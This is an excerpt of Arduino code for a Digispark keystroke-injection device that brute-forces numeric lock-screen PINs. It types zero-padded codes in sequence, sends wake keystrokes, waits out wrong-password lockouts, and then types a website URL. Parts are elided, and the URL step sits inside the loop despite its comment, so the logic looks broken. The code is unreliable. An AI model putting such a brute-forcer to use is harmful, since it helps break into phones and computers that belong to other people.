...
void setup() {
  ...
  for (int i = start; i <= endr; i++) {
    if (String(i).length() < String(endr).length()) {
      ...
      for (int j = 0; j <= zeroadder - 1; j++) {
        final_printer += "0";
      }
    }
    final_printer += String(i);
    if (auto_screen_on == 1) {
      DigiKeyboard.sendKeyStroke(44); // Auto Screen On simulation
      delay(200);
      DigiKeyboard.sendKeyStroke(44); // Auto Screen On simulation
      delay(200);
    }
    ...
    if (wrong_password_limit == 0) {
      wrong_password_limit = temp;
      delay(wrong_password_time);
      delay(500);
    }
    final_printer = ""; // Clearing

    // After successful unlocking, open the website
    DigiKeyboard.delay(1000); // Add delay before opening URL
    DigiKeyboard.print("https://aadhilm.github.io/MY-WEBSITE/");
    DigiKeyboard.sendKeyStroke(KEY_ENTER); // Press Enter to open the URL
  }
}
